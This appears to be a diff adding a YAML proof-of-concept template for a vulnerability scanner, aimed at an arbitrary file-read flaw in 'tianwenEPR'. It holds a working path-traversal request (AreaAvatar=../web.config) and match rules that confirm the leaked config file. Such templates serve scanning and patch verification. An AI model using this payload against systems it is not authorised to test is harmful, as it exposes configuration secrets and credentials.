@@ -1,0 +1,22 @@
+name: poc-yaml-tianwenEPR-AreaAvatarDownLoad-File-reading
+transport: http
+
+
+
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /HM/M_Main/InformationManage/AreaAvatarDownLoad.aspx?AreaAvatar=../web.config
+      headers:
+        User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)
+    expression: response.status == 200 && response.body.bcontains(b'<configuration>') && response.body.bcontains(b'</configuration>')
+
+expression: r0() 
+
+
+detail:
+  author: Superhero
+  links:
+    - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247485268&idx=1&sn=2bc5152edc4b369d67e4412a845ca784&chksm=c267b267f5103b71d8624c760c6dc5d032548c525067a5908350ab895c626e812fae3d3edcf8&token=1439003696&lang=zh_CN#rd
